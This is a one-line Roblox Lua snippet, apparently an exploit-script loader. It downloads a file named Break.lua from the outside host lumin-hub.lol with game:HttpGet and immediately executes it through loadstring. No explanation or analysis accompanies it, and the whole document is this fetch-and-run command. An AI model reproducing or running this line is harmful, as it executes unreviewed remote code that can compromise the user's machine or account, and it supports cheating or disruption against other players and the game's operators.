loadstring(game:HttpGet("http://lumin-hub.lol/Break.lua"))()
